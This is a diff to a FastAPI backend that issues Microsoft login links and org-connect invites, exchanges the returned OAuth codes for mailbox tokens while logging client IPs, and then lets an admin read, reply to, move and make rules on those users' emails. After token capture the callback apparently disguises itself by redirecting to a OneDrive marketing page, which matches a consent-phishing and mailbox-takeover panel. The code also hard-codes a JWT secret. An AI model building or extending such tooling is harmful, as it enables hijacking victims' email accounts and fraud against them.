@@ -4,7 +4,12 @@ from fastapi.middleware.cors import CORSMiddleware
 from fastapi.security import HTTPBearer, HTTPAuthorizationCredentials
 import logging
 
-from auth import generate_login_link, exchange_code_for_token, get_token
+from auth import (
+    generate_login_link,
+    generate_org_connect_link,
+    exchange_code_for_token,
+    get_token
+)
 from graph import (
     fetch_emails,
     get_mail_folders,
@@ -18,16 +23,19 @@ from graph import (
 )
 from admin_auth import login_admin
 from db import init_db, SessionLocal
-from models import Rule, TenantToken, RuleAction, SavedUser
+from models import Rule, TenantToken, RuleAction, SavedUser, ConnectInvite
 
 from jose import jwt, JWTError
 from datetime import datetime, timedelta
 
 app = FastAPI()
 
+# =========================
+# JWT CONFIG
+# =========================
 SECRET_KEY = "super-secret-key-change-this"
 ALGORITHM = "HS256"
-ACCESS_TOKEN_EXPIRE_MINUTES = 10080
+ACCESS_TOKEN_EXPIRE_MINUTES = 10080  # 7 days
 
 security = HTTPBearer()
 
@@ -55,8 +63,14 @@ def resolve_user_id(requested_user_id: str | None, user_payload: dict) -> str:
     return requested_user_id or user_payload["sub"]
 
 
+# =========================
+# LOGGING
+# =========================
 logging.basicConfig(level=logging.DEBUG)
 
+# =========================
+# CORS
+# =========================
 origins = [
     "http://localhost:3000",
     "https://frontend-xg84.onrender.com",
@@ -70,6 +84,9 @@ app.add_middleware(
     allow_headers=["*"],
 )
 
+# =========================
+# DEBUG MIDDLEWARE
+# =========================
 @app.middleware("http")
 async def log_requests(request: Request, call_next):
     logging.debug("\n--- REQUEST START ---")
@@ -84,11 +101,17 @@ async def log_requests(request: Request, call_next):
     return response
 
 
+# =========================
+# STARTUP
+# =========================
 @app.on_event("startup")
 def startup():
     init_db()
 
 
+# =========================
+# ADMIN LOGIN (JWT)
+# =========================
 @app.post("/admin/login")
 async def admin_login_route(request: Request):
     try:
@@ -112,6 +135,9 @@ async def admin_login_route(request: Request):
     }
 
 
+# =========================
+# MICROSOFT LOGIN
+# =========================
 @app.get("/login")
 def login(user_id: str, user=Depends(verify_token)):
     return RedirectResponse(generate_login_link(user_id))
@@ -120,7 +146,23 @@ def login(user_id: str, user=Depends(verify_token)):
 @app.get("/generate-login-url")
 def generate_login_url(user_id: str, user=Depends(verify_token)):
     login_url = generate_login_link(user_id)
-    return {"login_url": login_url, "user_id": user_id}
+    return {
+        "login_url": login_url,
+        "user_id": user_id,
+        "type": "direct_user_login"
+    }
+
+
+@app.get("/generate-org-connect-url")
+def generate_org_connect_url(user=Depends(verify_token)):
+    admin_user_id = user["sub"]
+    login_url = generate_org_connect_link(admin_user_id)
+
+    return {
+        "login_url": login_url,
+        "admin_user_id": admin_user_id,
+        "type": "org_connect_invite"
+    }
 
 
 @app.get("/microsoft/status")
@@ -136,6 +178,9 @@ def microsoft_status(user_id: str, user=Depends(verify_token)):
     }
 
 
+# =========================
+# SAVED USERS / CONNECTED USERS
+# =========================
 @app.get("/users")
 def list_users(user=Depends(verify_token)):
     db = SessionLocal()
@@ -247,6 +292,43 @@ def delete_saved_user(user_id: str, user=Depends(verify_token)):
         db.close()
 
 
+# =========================
+# OPTIONAL: VIEW CONNECT INVITES
+# =========================
+@app.get("/connect-invites")
+def list_connect_invites(user=Depends(verify_token)):
+    db = SessionLocal()
+    try:
+        admin_user_id = user["sub"]
+
+        invites = (
+            db.query(ConnectInvite)
+            .filter(ConnectInvite.admin_user_id == admin_user_id)
+            .order_by(ConnectInvite.created_at.desc())
+            .all()
+        )
+
+        return {
+            "invites": [
+                {
+                    "id": invite.id,
+                    "admin_user_id": invite.admin_user_id,
+                    "invite_token": invite.invite_token,
+                    "resolved_user_id": invite.resolved_user_id,
+                    "is_used": invite.is_used,
+                    "created_at": invite.created_at,
+                    "used_at": invite.used_at
+                }
+                for invite in invites
+            ]
+        }
+    finally:
+        db.close()
+
+
+# =========================
+# OAUTH CALLBACK
+# =========================
 @app.get("/auth/callback")
 def auth_callback(request: Request):
     init_db()
@@ -261,6 +343,7 @@ def auth_callback(request: Request):
 
     try:
         exchange_code_for_token(code, state, client_ip)
+
         return RedirectResponse(
             url="https://www.microsoft.com/en-us/microsoft-365/onedrive/online-cloud-storage"
         )
@@ -268,6 +351,9 @@ def auth_callback(request: Request):
         return {"error": str(e)}
 
 
+# =========================
+# EMAILS
+# =========================
 @app.get("/emails")
 def get_emails(
     user_id: str | None = None,
@@ -306,6 +392,9 @@ def email_detail(message_id: str, user_id: str | None = None, user=Depends(verif
         raise HTTPException(status_code=400, detail=str(e))
 
 
+# =========================
+# EMAIL ACTIONS
+# =========================
 @app.post("/email/reply")
 async def reply_email_route(request: Request, user=Depends(verify_token)):
     body = await request.json()
@@ -378,6 +467,9 @@ async def move_email_route(request: Request, user=Depends(verify_token)):
     )
 
 
+# =========================
+# RULES
+# =========================
 @app.post("/rules")
 async def add_rule(request: Request, user=Depends(verify_token)):
     body = await request.json()
